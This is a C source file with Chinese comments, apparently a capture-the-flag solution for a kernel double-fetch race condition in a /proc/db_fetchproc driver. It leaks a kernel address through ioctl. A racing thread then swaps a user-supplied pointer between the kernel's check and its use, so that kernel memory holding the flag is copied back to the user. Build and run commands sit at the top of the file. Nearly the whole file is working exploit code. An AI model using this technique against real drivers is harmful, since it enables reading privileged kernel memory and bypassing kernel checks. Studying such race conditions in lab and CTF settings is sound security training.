
//gcc -static exploit.c -lpthread -o exploit
//home/race_condition/double_fetch/exploit
//dmesg | grep 'db_fetch'

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>

pthread_t compete_thread;
void* real_addr;
char  buf[0x30] = "ccelend";
int competetion_times = 0x1000, status = 1;

struct 
{
    char* flag_addr;
    char* flag_data;
}flag = { .flag_addr = buf, .flag_data = NULL };

// 条件竞争线程
void* competetion_thread(void)
{
    //不断修改 flag.flag_addr 为内核中的 flag 地址 
    while (status)
    {
        for (int i = 0; i < competetion_times; i++)
            flag.flag_addr = real_addr;
    }
}

int main(int argc, char** argv, char** envp)
{
    int fd;
    char flag_addr_data[0x30], *flag_addr_addr;
    char flag_data_buf[0x30];
    flag.flag_data = flag_data_buf;

    // 打开设备
    fd = open("/proc/db_fetchproc", 2);
    ioctl(fd, 0x112233, flag_addr_data);

    // 得到 flag 字符串地址
    flag_addr_addr = strstr(flag_addr_data, "Your flag is at ") + strlen("Your flag is at ");
    // 字符串转换十六进制数
    real_addr = strtoull(flag_addr_addr, flag_addr_addr + 16, 16); 
    printf("\033[32m\033[1m[+] Flag addr: %p\033[0m\n", real_addr);

    // 创建条件竞争线程
    pthread_create(&compete_thread, NULL, competetion_thread, NULL);
    
    // 传递正确的地址
    for(int i = 0; i < competetion_times; i++)
    {
        flag.flag_addr = buf;
        ioctl(fd, 0x223344, &flag);
        if (strstr(flag.flag_data, "flag{")){
            break;
        }
    }
    pthread_cancel(compete_thread);

    printf("\033[32m\033[1m[+] Competetion end!\033[0m\n");
    printf("\033[32m\033[1m[+] The flag: %s\033[0m\n", flag.flag_data);
    return 0;
}

